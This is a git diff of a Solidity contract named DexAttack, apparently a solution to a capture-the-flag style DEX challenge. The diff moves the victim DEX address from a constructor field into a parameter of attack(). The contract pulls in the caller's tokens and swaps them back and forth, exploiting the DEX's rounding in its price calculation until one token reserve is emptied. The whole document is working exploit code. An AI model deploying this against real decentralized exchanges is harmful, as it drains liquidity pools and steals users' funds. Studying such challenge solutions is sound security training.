@@ -6,29 +6,21 @@ import "./interfaces/IDex.sol";
 import "./interfaces/ISwappableToken.sol";
 
 contract DexAttack {
-    IDex private immutable victimDex;
     uint256 private constant FROM = 0;
     uint256 private constant TO = 1;
     uint256 private constant MAX_UINT256 = type(uint256).max;
 
-    constructor(IDex victimDex_) {
-        victimDex = victimDex_;
-    }
-
-    function attack() external {
-        ISwappableToken[2] memory tokens = [ISwappableToken(victimDex.token1()), ISwappableToken(victimDex.token2())];
+    function attack(IDex target) external {
+        ISwappableToken[2] memory tokens = [ISwappableToken(target.token1()), ISwappableToken(target.token2())];
 
         for (uint256 i; i < tokens.length; ) {
             tokens[i].approve(msg.sender, address(this), MAX_UINT256);
 
             require(MAX_UINT256 == tokens[i].allowance(msg.sender, address(this)), "Dex: Sender approve failed");
 
-            tokens[i].approve(address(this), address(victimDex), MAX_UINT256);
+            tokens[i].approve(address(this), address(target), MAX_UINT256);
 
-            require(
-                MAX_UINT256 == tokens[i].allowance(address(this), address(victimDex)),
-                "Dex: Contract approve failed"
-            );
+            require(MAX_UINT256 == tokens[i].allowance(address(this), address(target)), "Dex: Contract approve failed");
 
             require(
                 tokens[i].transferFrom(msg.sender, address(this), tokens[i].balanceOf(msg.sender)),
@@ -47,27 +39,24 @@ contract DexAttack {
         while (true) {
             balances = [tokens[fromIndex].balanceOf(address(this)), tokens[toIndex].balanceOf(address(this))];
 
-            dexBalances = [
-                tokens[fromIndex].balanceOf(address(victimDex)),
-                tokens[toIndex].balanceOf(address(victimDex))
-            ];
+            dexBalances = [tokens[fromIndex].balanceOf(address(target)), tokens[toIndex].balanceOf(address(target))];
 
             if (
                 dexBalances[TO] <=
-                victimDex.getSwapPrice(address(tokens[fromIndex]), address(tokens[toIndex]), balances[FROM])
+                target.getSwapPrice(address(tokens[fromIndex]), address(tokens[toIndex]), balances[FROM])
             ) {
-                victimDex.swap(address(tokens[fromIndex]), address(tokens[toIndex]), dexBalances[FROM]);
+                target.swap(address(tokens[fromIndex]), address(tokens[toIndex]), dexBalances[FROM]);
                 break;
             }
 
-            victimDex.swap(address(tokens[fromIndex]), address(tokens[toIndex]), balances[FROM]);
+            target.swap(address(tokens[fromIndex]), address(tokens[toIndex]), balances[FROM]);
 
             fromIndex = 1 - fromIndex;
             toIndex = 1 - toIndex;
         }
 
         require(
-            0 == tokens[FROM].balanceOf(address(victimDex)) || 0 == tokens[TO].balanceOf(address(victimDex)),
+            0 == tokens[FROM].balanceOf(address(target)) || 0 == tokens[TO].balanceOf(address(target)),
             "Dex: Attack failed"
         );
     }
